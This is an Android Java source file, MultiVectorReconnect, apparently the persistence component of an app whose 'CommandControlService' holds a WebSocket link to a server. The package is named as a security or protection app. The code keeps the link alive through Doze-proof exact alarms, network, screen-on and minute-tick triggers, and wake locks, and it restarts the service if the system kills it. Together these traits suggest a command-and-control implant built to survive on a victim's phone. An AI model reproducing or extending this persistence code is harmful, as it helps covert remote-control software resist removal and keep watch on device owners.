package com.seguranca.protecao;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;

import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

/**
 * MultiVectorReconnect
 *
 * Drop-in replacement for the single-handler reconnect logic in CommandControlService.
 *
 * Five vectors that work together:
 *   1. Exponential backoff via Handler (in-process, immediate)
 *   2. AlarmManager setExactAndAllowWhileIdle (Doze-proof)
 *   3. ConnectivityManager.NetworkCallback (connects the moment network is up)
 *   4. Screen-on BroadcastReceiver (reconnects on screen wake)
 *   5. TIME_TICK receiver (every minute fallback)
 *
 * Usage in CommandControlService:
 *   // Field:
 *   private final MultiVectorReconnect reconnect = new MultiVectorReconnect();
 *
 *   // In onCreate():
 *   reconnect.init(this, this::connectToServer);
 *
 *   // In onOpen() (connected):
 *   reconnect.onConnected();
 *
 *   // In onClosed() / onFailure():
 *   reconnect.scheduleReconnect();
 *
 *   // In onDestroy():
 *   reconnect.destroy();
 */
public class MultiVectorReconnect {

    private static final String TAG = "MVReconnect";

    // ── Backoff tuning ────────────────────────────────────────────────────────

    private static final int INITIAL_DELAY_MS = 1_500;
    private static final int MAX_DELAY_MS     = 30_000;   // 30s cap
    private static final int ALARM_INTERVAL_MS= 45_000;   // Alarm fires every 45s when disconnected
    private static final int ALARM_JOB_ID     = 0xC2EC;

    // ── State ─────────────────────────────────────────────────────────────────

    private final AtomicBoolean connected      = new AtomicBoolean(false);
    private final AtomicBoolean destroyed      = new AtomicBoolean(false);
    private final AtomicBoolean reconnecting   = new AtomicBoolean(false);
    private final AtomicInteger attempt        = new AtomicInteger(0);
    private final AtomicLong    lastAttemptMs  = new AtomicLong(0);
    private static final long   MIN_INTERVAL   = 800;

    private Runnable connectFn;
    private Context  appCtx;
    private Handler  handler;

    // BroadcastReceiver: SCREEN_ON + TIME_TICK
    private BroadcastReceiver screenReceiver;
    // NetworkCallback
    private ConnectivityManager.NetworkCallback networkCallback;
    // WakeLock for reconnect window
    private PowerManager.WakeLock reconnectWl;

    // ── Init / destroy ────────────────────────────────────────────────────────

    public void init(Context ctx, Runnable connectFunction) {
        this.appCtx    = ctx.getApplicationContext();
        this.connectFn = connectFunction;
        this.handler   = new Handler(Looper.getMainLooper());
        destroyed.set(false);

        registerScreenReceiver();
        registerNetworkCallback();
        Log.i(TAG, "MultiVectorReconnect initialized");
    }

    public void destroy() {
        if (!destroyed.compareAndSet(false, true)) return;
        handler.removeCallbacksAndMessages(null);
        cancelAlarm();
        unregisterScreenReceiver();
        unregisterNetworkCallback();
        releaseWakeLock();
        Log.i(TAG, "MultiVectorReconnect destroyed");
    }

    // ── Public API ────────────────────────────────────────────────────────────

    /** Called when WebSocket successfully opens. Cancels all pending reconnect attempts. */
    public void onConnected() {
        connected.set(true);
        reconnecting.set(false);
        attempt.set(0);
        handler.removeCallbacksAndMessages(null);
        cancelAlarm();
        releaseWakeLock();
        Log.i(TAG, "Connected — all reconnect vectors cancelled");
    }

    /**
     * Triggers all reconnect vectors immediately.
     * Safe to call multiple times (debounced internally).
     */
    public void scheduleReconnect() {
        if (destroyed.get()) return;
        connected.set(false);

        long now = System.currentTimeMillis();
        long last = lastAttemptMs.get();
        if (now - last < MIN_INTERVAL) return;
        lastAttemptMs.set(now);

        int n = attempt.incrementAndGet();

        // Exponential backoff: 1.5s → 3s → 6s → 12s → 30s (cap)
        int delay = (int) Math.min(INITIAL_DELAY_MS * Math.pow(1.9, n - 1), MAX_DELAY_MS);

        Log.d(TAG, "Reconnect scheduled — attempt=" + n + " delay=" + delay + "ms");

        acquireWakeLock(10_000);

        // Vector 1: Handler
        handler.removeCallbacksAndMessages(null);
        handler.postDelayed(this::attemptConnect, delay);

        // Vector 2: Alarm (fires independently of process Handler)
        scheduleAlarm(delay + 2000);
    }

    // ── Internal connect ──────────────────────────────────────────────────────

    private void attemptConnect() {
        if (destroyed.get() || connected.get()) return;
        if (!reconnecting.compareAndSet(false, true)) return;
        try {
            connectFn.run();
        } finally {
            // reconnecting is reset when onConnected or onFailure fires
            handler.postDelayed(() -> reconnecting.set(false), 5000);
        }
    }

    // ── Vector 2: AlarmManager ────────────────────────────────────────────────

    private void scheduleAlarm(int delayMs) {
        if (appCtx == null) return;
        AlarmManager am = (AlarmManager) appCtx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;

        PendingIntent pi = alarmPi();
        long trigger = SystemClock.elapsedRealtime() + delayMs;

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }
        } catch (Exception e) {
            Log.w(TAG, "Alarm schedule error: " + e.getMessage());
        }
    }

    private void cancelAlarm() {
        if (appCtx == null) return;
        try {
            AlarmManager am = (AlarmManager) appCtx.getSystemService(Context.ALARM_SERVICE);
            if (am != null) am.cancel(alarmPi());
        } catch (Exception ignored) {}
    }

    private PendingIntent alarmPi() {
        Intent i = new Intent(appCtx, ReconnectAlarmReceiver.class);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) flags |= PendingIntent.FLAG_MUTABLE;
        return PendingIntent.getBroadcast(appCtx, ALARM_JOB_ID, i, flags);
    }

    /** Alarm fires → forward to CCS reconnect. */
    public static class ReconnectAlarmReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            Log.d(TAG, "Alarm fired — attempting reconnect");
            CommandControlService ccs = CommandControlService.sInstance;
            if (ccs != null && !ccs.isConnected) {
                ccs.connectToServer();
                // Reschedule alarm for next cycle
                if (ccs.reconnect != null) {
                    ccs.reconnect.scheduleAlarm(ALARM_INTERVAL_MS);
                }
            } else if (ccs == null) {
                // CCS is dead — restart it
                Intent svc = new Intent(ctx, CommandControlService.class);
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(svc);
                    } else {
                        ctx.startService(svc);
                    }
                } catch (Exception e) {
                    Log.w(TAG, "CCS restart from alarm failed: " + e.getMessage());
                }
            }
        }
    }

    // ── Vector 3: NetworkCallback ─────────────────────────────────────────────

    private void registerNetworkCallback() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP || appCtx == null) return;
        try {
            ConnectivityManager cm =
                (ConnectivityManager) appCtx.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return;

            NetworkRequest req = new NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .addCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                .build();

            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onAvailable(Network network) {
                    Log.d(TAG, "Network available — trigger reconnect");
                    if (!connected.get() && !destroyed.get()) {
                        handler.postDelayed(() -> attemptConnect(), 500);
                    }
                }
                @Override
                public void onLost(Network network) {
                    Log.d(TAG, "Network lost");
                }
            };
            cm.registerNetworkCallback(req, networkCallback);
        } catch (Exception e) {
            Log.w(TAG, "NetworkCallback register failed: " + e.getMessage());
        }
    }

    private void unregisterNetworkCallback() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP || appCtx == null) return;
        if (networkCallback == null) return;
        try {
            ConnectivityManager cm =
                (ConnectivityManager) appCtx.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) cm.unregisterNetworkCallback(networkCallback);
        } catch (Exception ignored) {}
        networkCallback = null;
    }

    // ── Vectors 4 & 5: SCREEN_ON + TIME_TICK ─────────────────────────────────

    private void registerScreenReceiver() {
        if (appCtx == null) return;
        screenReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                if (connected.get() || destroyed.get()) return;
                Log.d(TAG, "Trigger from: " + action);
                handler.postDelayed(() -> attemptConnect(), 300);
            }
        };
        IntentFilter f = new IntentFilter();
        f.addAction(Intent.ACTION_SCREEN_ON);
        f.addAction(Intent.ACTION_USER_PRESENT);
        f.addAction(Intent.ACTION_TIME_TICK);          // Every minute
        f.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        try {
            appCtx.registerReceiver(screenReceiver, f);
        } catch (Exception e) {
            Log.w(TAG, "screenReceiver register failed: " + e.getMessage());
        }
    }

    private void unregisterScreenReceiver() {
        if (appCtx == null || screenReceiver == null) return;
        try { appCtx.unregisterReceiver(screenReceiver); } catch (Exception ignored) {}
        screenReceiver = null;
    }

    // ── WakeLock ──────────────────────────────────────────────────────────────

    private void acquireWakeLock(long timeoutMs) {
        try {
            if (reconnectWl == null) {
                PowerManager pm = (PowerManager) appCtx.getSystemService(Context.POWER_SERVICE);
                if (pm == null) return;
                reconnectWl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "App:MVReconnect");
                reconnectWl.setReferenceCounted(false);
            }
            if (!reconnectWl.isHeld()) reconnectWl.acquire(timeoutMs);
        } catch (Exception ignored) {}
    }

    private void releaseWakeLock() {
        try {
            if (reconnectWl != null && reconnectWl.isHeld()) reconnectWl.release();
        } catch (Exception ignored) {}
    }

    // ── Status ────────────────────────────────────────────────────────────────

    public boolean isConnected()  { return connected.get(); }
    public int     getAttempts()  { return attempt.get(); }
}
